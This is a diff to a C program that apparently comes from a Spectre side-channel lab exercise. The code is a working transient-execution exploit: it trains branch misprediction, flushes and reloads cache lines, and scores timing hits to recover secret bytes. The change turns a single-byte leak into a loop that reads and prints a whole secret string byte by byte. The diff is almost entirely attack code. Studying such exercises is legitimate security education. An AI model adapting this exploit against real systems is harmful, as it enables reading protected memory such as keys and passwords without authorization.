@@ -70,23 +70,39 @@ void spectreAttack(size_t larger_x)
   array[s*4096 + DELTA] += 88;
 }
 
-int main() {
+int getascii(size_t larger_x)
+{
   int i;
   uint8_t s;
-  size_t larger_x = (size_t)(secret-(char*)buffer);
   flushSideChannel();
-  for(i=0;i<256; i++) scores[i]=0; 
-  for (i = 0; i < 1000; i++) {
+  _mm_clflush(&larger_x);
+  for (i = 0;i< 256;i++) scores[i] = 0;
+  for (i = 0;i< 1000;i++) {
     spectreAttack(larger_x);
     reloadSideChannelImproved();
   }
-  int max = 0;
-  for (i = 0; i < 256; i++){
-   if(scores[max] < scores[i])  
-     max = i;
+
+  int max = 1;
+  for (i = 2; i < 256; i ++ ) {
+    if(scores[max] < scores[i]) max = i;
   }
-  printf("Reading secret value at %p = ", (void*)larger_x);
-  printf("The  secret value is %d\n", max);
-  printf("The number of hits is %d\n", scores[max]);
-  return (0); 
+
+
+  if (scores[max] == 0) {
+    return 0;
+  } else {
+    return max;
+  }
+}
+
+int main() {
+  size_t larger_x = (size_t)(secret-(char*)buffer);
+  int s = getascii(larger_x);
+  printf("The secret is:\n");
+  while(s != 0) {
+    printf("%c\n",s);
+    larger_x++;
+    s = getascii(larger_x);
+  }
+  return 0;
 }
